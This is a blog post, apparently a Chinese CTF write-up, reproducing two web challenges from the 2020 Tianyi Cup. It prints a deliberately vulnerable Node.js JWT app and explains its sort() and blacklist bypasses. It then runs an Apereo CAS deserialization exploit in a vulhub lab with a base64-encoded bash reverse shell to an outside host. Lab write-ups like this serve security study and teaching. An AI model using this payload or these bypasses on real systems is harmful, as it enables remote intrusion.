@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    2020天翼杯Web题目复现 |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-2020天翼杯Web题目复现" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2020天翼杯Web题目复现
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2020-08-06T00:42:44.000Z" itemprop="datePublished">2020-08-06</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>2020天翼杯Web题目复现</p>
+<a id="more"></a>
+
+<h1 id="0x01-API"><a href="#0x01-API" class="headerlink" title="0x01 API"></a>0x01 API</h1><p>首先在本地搭建环境，app.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">"express"</span>);</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">"cors"</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="comment">//const uuidv4 = require("uuid/v4"); 本地复现时最新版本的uuid不支持这种写法</span></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">v4</span>: uuidv4 &#125; = <span class="built_in">require</span>(<span class="string">'uuid'</span>);</span><br><span class="line"><span class="keyword">const</span> md5 = <span class="built_in">require</span>(<span class="string">"md5"</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">"express-jwt"</span>);</span><br><span class="line"><span class="keyword">const</span> jsonwebtoken = <span class="built_in">require</span>(<span class="string">"jsonwebtoken"</span>);</span><br><span class="line"><span class="keyword">const</span> server = <span class="built_in">require</span>(<span class="string">"http"</span>).createServer(app);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; flag, secret, jwtSecret &#125; = <span class="built_in">require</span>(<span class="string">"./flag"</span>);</span><br><span class="line"><span class="comment">/*console.log(require("./flag"));</span></span><br><span class="line"><span class="comment">console.log(flag);</span></span><br><span class="line"><span class="comment">console.log(secret);</span></span><br><span class="line"><span class="comment">console.log(jwtSecret);*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  port: process.env.PORT || <span class="number">8081</span>,</span><br><span class="line">  adminValue: <span class="number">1000</span>,</span><br><span class="line">  message: <span class="string">"Can you get flag?"</span>,</span><br><span class="line">  secret: secret,</span><br><span class="line">  adminUsername: <span class="string">"kirakira_dokidoki"</span>,</span><br><span class="line">  whitelist: [<span class="string">"/"</span>, <span class="string">"/login"</span>, <span class="string">"/init"</span>, <span class="string">"/source"</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> users = &#123;</span><br><span class="line">  <span class="number">0</span>: &#123;</span><br><span class="line">    username: config.adminUsername,</span><br><span class="line">    isAdmin: <span class="literal">true</span>,</span><br><span class="line">    rights: <span class="built_in">Object</span>.keys(config)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line"></span><br><span class="line">app.use(cors());</span><br><span class="line"></span><br><span class="line">app.use(</span><br><span class="line">  jwt(&#123; <span class="attr">secret</span>: jwtSecret &#125;).unless(&#123;</span><br><span class="line">    path: config.whitelist</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">error, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (error.name === <span class="string">"UnauthorizedError"</span>) &#123;</span><br><span class="line">    res.json(err(<span class="string">"Invalid token or not logged in."</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sign</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> jsonwebtoken.sign(o, jwtSecret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ok</span>(<span class="params">data = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">status</span>: <span class="string">"ok"</span>, <span class="attr">data</span>: data &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">err</span>(<span class="params">msg = <span class="string">"Something went wrong."</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">status</span>: <span class="string">"error"</span>, <span class="attr">message</span>: msg &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidUser</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.username.length &gt;= <span class="number">6</span> &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase() &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toLowerCase()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (u.username.toUpperCase() === config.adminUsername.toUpperCase() &amp;&amp; u.username.toUpperCase() === config.adminUsername.toLowerCase()) || u.isAdmin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkRights</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> blacklist = [<span class="string">"secret"</span>, <span class="string">"port"</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(blacklist.includes(arr)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = arr[i];</span><br><span class="line">    <span class="keyword">if</span> (blacklist.includes(element)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  res.json(ok(&#123; <span class="attr">hint</span>:  <span class="string">"You can get source code from /source"</span>&#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/source"</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.sendFile( __dirname + <span class="string">"/"</span> + <span class="string">"app.js"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/login"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> u = &#123;</span><br><span class="line">    username: req.body.username,</span><br><span class="line">    id: uuidv4(),</span><br><span class="line">    value: <span class="built_in">Math</span>.random() &lt; <span class="number">0.0000001</span> ? <span class="number">100000000</span> : <span class="number">100</span>,</span><br><span class="line">    isAdmin: <span class="literal">false</span>,</span><br><span class="line">    rights: [</span><br><span class="line">      <span class="string">"message"</span>,</span><br><span class="line">      <span class="string">"adminUsername"</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">console</span>.log(u);</span><br><span class="line">  <span class="keyword">if</span> (isValidUser(u)) &#123;</span><br><span class="line">    users[u.id] = u;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: u.id &#125;) &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.json(err(<span class="string">"Invalid creds"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/init"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123; secret &#125; = req.body;</span><br><span class="line">  <span class="keyword">let</span> target = md5(config.secret.toString());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> adminId = md5(secret)</span><br><span class="line">    .split(<span class="string">""</span>)</span><br><span class="line">    .map(<span class="function">(<span class="params">c, i</span>) =&gt;</span> c.charCodeAt(<span class="number">0</span>) ^ target.charCodeAt(i))</span><br><span class="line">    .reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b);</span><br><span class="line">  <span class="built_in">console</span>.log(adminId);</span><br><span class="line">  res.json(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: adminId &#125;) &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Get server info</span></span><br><span class="line">app.get(<span class="string">"/serverInfo"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(req.user);</span><br><span class="line">  <span class="keyword">let</span> user = users[req.user.id] || &#123; <span class="attr">rights</span>: [] &#125;;</span><br><span class="line">  <span class="built_in">console</span>.log(user);</span><br><span class="line">  <span class="keyword">let</span> info = user.rights.map(<span class="function"><span class="params">i</span> =&gt;</span> (&#123; <span class="attr">name</span>: i, <span class="attr">value</span>: config[i] &#125;));</span><br><span class="line">  res.json(ok(&#123; <span class="attr">info</span>: info &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/becomeAdmin"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123;value&#125; = req.body;</span><br><span class="line">  <span class="keyword">let</span> uid = req.user.id;</span><br><span class="line">  <span class="keyword">let</span> user = users[uid];</span><br><span class="line">  <span class="built_in">console</span>.log(user);</span><br><span class="line">  <span class="keyword">let</span> maxValue = [value, config.adminValue].sort()[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span>(value &gt;= maxValue &amp;&amp; user.value &gt;= value) &#123;</span><br><span class="line">    user.isAdmin = <span class="literal">true</span>;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">isAdmin</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.json(err(<span class="string">"You need pay more!"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// only admin can update user</span></span><br><span class="line">app.post(<span class="string">"/updateUser"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> uid = req.user.id;</span><br><span class="line">  <span class="keyword">let</span> user = users[uid];</span><br><span class="line">  <span class="keyword">if</span> (!user || !isAdmin(user)) &#123;</span><br><span class="line">    res.json(err(<span class="string">"You're not an admin!"</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> rights = req.body.rights || [];</span><br><span class="line">  <span class="keyword">if</span> (rights.length &gt; <span class="number">0</span> &amp;&amp; checkRights(rights)) &#123;</span><br><span class="line">    users[uid].rights = user.rights.concat(rights).filter(<span class="function">(<span class="params">value, index, self</span>)=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> self.indexOf(value) === index;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.json(ok(&#123; <span class="attr">user</span>: users[uid] &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// only uid===0 can get the flag</span></span><br><span class="line">app.get(<span class="string">"/flag"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.user.id == <span class="number">0</span>) &#123;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">flag</span>: flag &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.send(err(<span class="string">"Unauthorized"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(config.port, () =&gt;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Server listening on port <span class="subst">$&#123;config.port&#125;</span>!`</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>在app.js目录下新建flag.json，内容如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"flag"</span>: <span class="string">"flag&#123;mount4in&#125;"</span>,</span><br><span class="line">    <span class="attr">"secret"</span>: <span class="string">"1145141919810"</span>,</span><br><span class="line">    <span class="attr">"jwtSecret"</span>: <span class="string">"secret"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>package.json</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"api"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"app.js"</span>,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"author"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"ISC"</span>,</span><br><span class="line">  <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"cors"</span>: <span class="string">"^2.8.5"</span>,</span><br><span class="line">    <span class="attr">"express"</span>: <span class="string">"^4.17.1"</span>,</span><br><span class="line">    <span class="attr">"express-jwt"</span>: <span class="string">"^5.0.0"</span>,</span><br><span class="line">    <span class="attr">"md5"</span>: <span class="string">"^2.3.0"</span>,</span><br><span class="line">    <span class="attr">"uuid"</span>: <span class="string">"^8.3.0"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析题目，题目是改的<a href="https://xz.aliyun.com/t/7177" target="_blank" rel="noopener">HackTM</a>的一道Node Js，较原题添加了一个关于javascript中sort()函数的trick。</p>
+<img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806085223552.png" alt="image-20200806085223552" style="zoom:200%;">
+
+<p>接下来分析题目，题目源码引用了jsonwebtoken和express-jwt两个库，jsonwebtoken用来生成jwt，发送给客户端，express-jwt用来解密客户端发送HTTP请求中携带的Authorization字段，然后将解密后的值赋给<code>req.user</code>。如下图的代码，表示除了<code>/</code>, <code>/login</code>, <code>/init</code>, <code>/source</code>这四个路由以外，访问其他路由时都需要带Authorization字段。</p>
+<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806085727632.png" alt="image-20200806085727632"></p>
+<p>首先看如何才能得到flag，</p>
+<img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806085323881.png" alt="image-20200806085323881" style="zoom:200%;">
+
+<p>必须要req.user.id为0才可以得到flag，接下来寻找怎么能让user.id为0，看/init路由</p>
+<img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806090112714.png" alt="image-20200806090112714" style="zoom:200%;">
+
+<p>上述代码，首先获取请求的secret值，然后将请求输入的secret和源码中config中的secret分别MD5处理，之后将这两个MD5生成的字符串每位分别进行异或，然后将每一位异或得到的结果取和，将和赋给adminId，利用jsonwebtoken进行加密。我们需要得到id为0对应的token,所以需要使这里的adminId为0，当两个相同的数异或得到的结果为0，所以这里需要我们输入的secret和源码中config.secret相同，接下来需要寻找config.secret的值。普通的用户访问/serverinfo得到的信息只有message和adminUsername，所以需要更新权限获得secret。</p>
+<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091148515.png" alt="image-20200806091148515"></p>
+<p>在/updateUser路由可以根据输入的rights更新用户的权限，但是需要是admin。</p>
+<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091329390.png" alt="image-20200806091329390"></p>
+<p>看一下isAdmin()函数</p>
+<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091539505.png" alt="image-20200806091539505"></p>
+<p>大小写应该是绕不过了，看哪里可以修改u.isAdmin，</p>
+<img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091642147.png" alt="image-20200806091642147" style="zoom:150%;">
+
+<p>在/becomeAdmin路由，因为登录时user.value值有很大的概率为100</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">let u = &#123;</span><br><span class="line">    username: req.body.username,</span><br><span class="line">    id: uuidv4(),</span><br><span class="line">    value: Math.random() &lt; <span class="number">0.0000001</span> ? <span class="number">100000000</span> : <span class="number">100</span>,</span><br><span class="line">    isAdmin: <span class="keyword">false</span>,</span><br><span class="line">    rights: [</span><br><span class="line">      <span class="string">"message"</span>,</span><br><span class="line">      <span class="string">"adminUsername"</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>利用sort()函数排序的问题，输入value为2即可绕过，成为admin,然后看checkRights()函数，</p>
+<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091346333.png" alt="image-20200806091346333"></p>
+<p>这里遍历数组中的每个元素，如果包含secret就不能添加，采用<code>[[&quot;secret&quot;]]</code>可以绕过。</p>
+<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093341659.png" alt="image-20200806093341659" style="zoom: 150%;"><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093503900.png" alt="image-20200806093503900"></p>
+<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093341659.png" alt="image-20200806093341659" style="zoom: 150%;"><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093503900.png" alt="image-20200806093503900"></p>
+<p>之后利用/serverInfo得到secret，在用/init得到id为1的用户token去访问/flag即可。</p>
+<p>解题过程</p>
+<ol>
+<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093725700.png" alt="image-20200806093725700"></li>
+<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093800754.png" alt="image-20200806093800754"></li>
+<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093822275.png" alt="image-20200806093822275"></li>
+<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093913761.png" alt="image-20200806093913761"></li>
+<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093948710.png" alt="image-20200806093948710"></li>
+<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806094012071.png" alt="image-20200806094012071"></li>
+</ol>
+<h1 id="0x02-apereocas"><a href="#0x02-apereocas" class="headerlink" title="0x02 apereocas"></a>0x02 <strong>apereocas</strong></h1><p>利用p神的vulhub环境进行复现，</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/apereo-cas/4.1-rce/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806203813868.png" alt="image-20200806203813868"></p>
+<ul>
+<li><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2></li>
+</ul>
+<p><a href="https://github.com/vulhub/Apereo-CAS-Attack" target="_blank" rel="noopener">Apereo-CAS-Attack</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806204844774.png" alt="image-20200806204844774"></p>
+<p>burp发包：</p>
+<p>vps：</p>
+<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806204957401.png" alt="image-20200806204957401"></p>
+<ul>
+<li><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2></li>
+</ul>
+<p><a href="https://github.com/potats0/CasExp" target="_blank" rel="noopener">CasExp</a></p>
+<p>下载下来需要自己打包才可以用，记录下自己打包mvn项目时踩的坑。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;potats0&#x2F;CasExp</span><br></pre></td></tr></table></figure>
+
+<p>配置maven</p>
+<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808111602995.png" alt="image-20200808111602995"></p>
+<p>选择Enable Auto-Import</p>
+<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808111507624.png" alt="image-20200808111507624"></p>
+<p>打包</p>
